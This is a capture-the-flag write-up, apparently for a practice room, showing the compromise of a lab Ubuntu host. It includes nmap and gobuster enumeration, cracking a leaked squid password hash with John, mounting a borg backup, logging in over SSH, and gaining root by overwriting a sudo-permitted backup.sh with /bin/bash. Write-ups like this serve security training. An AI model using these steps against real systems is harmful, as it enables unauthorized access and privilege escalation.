**Task 2 - Compromise The System**

So, firstly Let's do a NMAP scan.

> nmap -sV 10.10.142.247 -T3

```
Nmap scan report for 10.10.142.247
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After That, we realize there is an apache webserver.

To search directories, let's bruteforce.

> gobuster dir -u http://10.10.142.247/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

And we see 2 directories.

```
[+] Url:                     http://10.10.142.247/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2022/12/31 16:36:52 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.142.247/admin/]
/etc                  (Status: 301) [Size: 312] [--> http://10.10.142.247/etc/]
```

If we take a look at `http://10.10.142.247/etc/squid/passwd` there is a user and its md5-long password hash

> music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

So I will use the John to crack password hash for user `music_archive`

I put the hash in the passwd.txt file that I just created

> echo "music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn." > passwd.txt

> john --wordlist=/usr/share/wordlists/sqlmap.txt passwd.txt 

```
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 ASIMD 4x2])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (music_archive)     
1g 0:00:00:11 DONE (2022-12-31 16:49) 0.08389g/s 120697p/s 120697c/s 120697C/s squeek..squinch
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We found out the password. We had the username as well.

So heading into `http://10.10.134.61/admin/` and click Archive>Download

The file archive.tar is downloaded.

> tar -xf archive.tar

If we take a look inside of it, we see that the archive is encrypted with borg

I surfed into `https://borgbackup.readthedocs.io/en/stable/quickstart.html#restoring-a-backup`

and found out that we need to mount this archive but we also need a phrase.

> apt-get install borg -y

Created a directory in home and tried to mount archive into there.

> mkdir ~/Documents/borgmnt/

> borg mount ~/Downloads/home/field/dev/final_archive/ ~/Documents/borgmnt

`Enter passphrase for key /root/Downloads/home/field/dev/final_archive:`

And then entered the password that we found recently (squidward)

So It's mounted to ~/Documents/borgmnt/

If we move into there, we find user files of alex

In Documents, there is a note.txt that includes:

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:**********
```

Now, we can ssh into the user!

> ssh alex@10.10.142.247

Password: **********

```
lex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt 
**************************
alex@ubuntu:~$
```

**Privilege Escalation**

Let's see which files we have access to

> sudo -l

```
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

So that means we can run /etc/mp3backups/backup.sh

If we take a look at the files in /etc/mp3backups/ directory,

We see backup.sh file is owned by alex user

```
-rw-r--r--   1 root root   350 Dec 31 15:39 backed_up_files.txt
-r-xr-xr--   1 alex alex  1083 Dec 30  2020 backup.sh
-rw-r--r--   1 root root    45 Dec 31 15:39 ubuntu-scheduled.tgz
```

We can modify or run it as sudo.

Let's try adding command to the sh file.

> cd /etc/mp3backups/

> echo "/bin/bash" > backup.sh

-bash: backup.sh: Permission denied

We can't write on it as the file permissions have not set. Let's set it with:

> chmod 777 backup.sh

Now We are ready to add a line and run it.

> echo "/bin/bash" > backup.sh

> sudo ./backup.sh

Now the command has ran, we should have access to root user now.

```
root@ubuntu:/etc/mp3backups# whoami
root
root@ubuntu:/etc/mp3backups#
```

Flag is located in `/root/root.txt` so:

> cat /root/root.txt
*****************

Note: I enjoyed this room :)
